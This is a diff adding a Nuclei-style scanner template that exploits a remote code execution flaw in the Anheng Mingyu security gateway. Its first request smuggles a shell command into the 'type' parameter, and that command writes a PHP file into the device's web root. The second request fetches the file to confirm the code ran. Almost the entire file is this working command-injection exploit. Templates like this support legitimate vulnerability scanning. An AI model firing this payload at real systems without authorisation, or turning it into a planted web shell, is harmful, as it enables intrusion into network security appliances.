@@ -1,0 +1,45 @@
+id: poc-yaml-ah-mingyu-security-gateway-rce
+info:
+  name: 安恒 明御安全网关 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce,两高一弱
+
+variables:
+  t1: "{{rand_base(3)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/webui/?g=aaa_portal_auth_config_reset&type=1%3Becho%20'%3C%3Fphp%20echo%20md5(\"{{t1}}\")%3B%3F%3E'%20%3E%2Fusr%2Flocal%2Fwebui%2Ftest.php%3B"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+        part: body
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/test.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
